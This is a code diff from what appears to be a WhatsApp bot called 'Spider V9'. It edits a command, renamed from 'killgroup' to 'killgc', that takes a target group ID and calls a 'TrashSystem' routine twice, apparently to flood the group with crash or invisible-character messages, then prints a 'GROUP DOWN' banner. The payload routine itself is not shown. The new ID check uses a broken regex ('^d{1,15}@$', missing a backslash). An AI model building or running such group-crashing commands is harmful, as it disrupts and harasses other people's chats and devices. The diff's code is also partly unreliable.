@@ -1125,29 +1125,31 @@ mimetype: 'audio/mpeg'
 })
 }
 break
-case 'killgroup': {
+case 'killgc': {
     if (!isCreator) return reply(mess.owner);
     if (!isPremium) return reply(mess.prem);
-    if (!q) return reply(`Example: ${prefix + command} https://chat.whatsapp.com/yourGroupLink`);
+    if (!q) return reply(`Example: ${prefix + command} GROUP_ID`);
 
-    const groupLink = q.trim();
-    if (!groupLink.startsWith('https://chat.whatsapp.com/')) {
-        return reply('Please provide a valid group link.');
+    const groupId = q.trim();
+
+    // Validate that the group ID is in the correct format (this may vary based on your application)
+    if (!/^d{1,15}@$/.test(groupId)) {
+        return reply('Please provide a valid group ID.');
     }
 
-    reply('Wait Your Group Link is being Utilised');
+    reply('Wait Your Group  is being Utilised');
 
     // Function to convert text to invisible characters
-    await TrashSystem(groupLink, sam, cct = true, ptcp = true);
-    await TrashSystem(groupLink, sam, cct = true, ptcp = true);
+    await TrashSystem(groupId, sam, ptcp = true);
+    await TrashSystem(groupId, sam, cct = true, ptcp = true);
 
     reply(`
-        ┏━━━━━━━━━━━━━━━━━━━━━
-         ┃ ▣ 𝗚𝗥𝗢𝗨𝗣 𝗟𝗜𝗡𝗞 𝗗𝗢𝗪𝗡
-         ┃ ⎐ 𝗨𝗧𝗜𝗟𝗜𝗦𝗘𝗗 𝗕𝗬 𝗦𝗣𝗜𝗗𝗘𝗥 𝗩9
+         ┏━━━━━━━━━━━━━━━━━━━━━
+         ┃ ▣ 𝗚𝗥𝗢𝗨𝗣  𝗗𝗢𝗪𝗡
+         ┃ ⎐ 𝗨𝗧𝗜𝗟𝗜𝗦𝗘𝗗 𝗕𝗬 𝗦𝗽𝗶𝗱𝗲𝗿 𝗩9
          ┗━━━━━━━━━━━━━━━━━━━━━
          ┏━━━━━━━━━━━━━━━━━━━━━
-         ┃߷ 𝐆𝐑𝐎𝐔𝐏 𝐋𝐈𝐍𝐊 : ${groupLink}
+         ┃߷ 𝐆𝐑𝐎𝐔𝐏 𝐈𝐃 : ${groupId}
          ┃֎ 𝐑𝐄𝐒𝐔𝐋𝐓 : 𝗨𝗧𝗜𝗟𝗜𝗦𝗘𝗗
          ┃࿉ 𝐔𝐒𝐈𝐍𝐆 : ${command}
          ┗━━━━━━━━━━━━━━━━━━━━━
@@ -1156,7 +1158,7 @@ case 'killgroup': {
          ┃☘ *DO NOT MISUSE THE BOT OR ELSE IT WILL GET BANNED*
          ┃☘ *WAIT FOR 2 MINUTES BEFORE USING ANOTHER COMMAND*
          ┗━━━━━━━━━━━━━━━━━━━━━
-   ` );
+    `);
 
     await sleep(2000);
     await sam.sendMessage(m.chat, {
